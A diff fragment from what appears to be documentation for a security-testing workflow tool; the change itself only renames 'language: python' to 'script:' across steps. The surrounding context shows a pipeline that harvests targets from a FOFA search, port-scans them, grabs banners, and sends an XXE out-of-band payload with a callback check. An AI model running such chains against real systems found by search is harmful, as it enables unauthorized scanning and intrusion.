@@ -448,7 +448,7 @@ jobs:
           results = fofa.search('{{ inputs.target_query }}', size={{ inputs.max_targets }})
           targets = [r['ip'] for r in results]
           print(f"targets={','.join(targets)}")
-        language: python
+        script:
         outputs:
           targets: "{{ step.targets }}"
       
@@ -464,7 +464,7 @@ jobs:
                   'open_ports': [r['port'] for r in results if r['status'] == 'open']
               })
           print(f"scan_results={all_results}")
-        language: python
+        script:
         outputs:
           scan_results: "{{ step.scan_results }}"
       
@@ -480,7 +480,7 @@ jobs:
               for port in result['open_ports']:
                   info = grabber.grab(result['host'], port)
                   print(f"{result['host']}:{port} - {info.get('banner', 'No banner')}")
-        language: python
+        script:
 ```
 
 **OOB Testing Workflow:**
@@ -503,7 +503,7 @@ jobs:
           <data>&xxe;</data>'''
           print(f"payload={payload}")
           print(f"xml={xml}")
-        language: python
+        script:
         outputs:
           payload: "{{ step.payload }}"
           xml: "{{ step.xml }}"
@@ -517,7 +517,7 @@ jobs:
               data=xml,
               headers={'Content-Type': 'application/xml'}
           )
-        language: python
+        script:
       
       - name: Verify Callback
         run: |
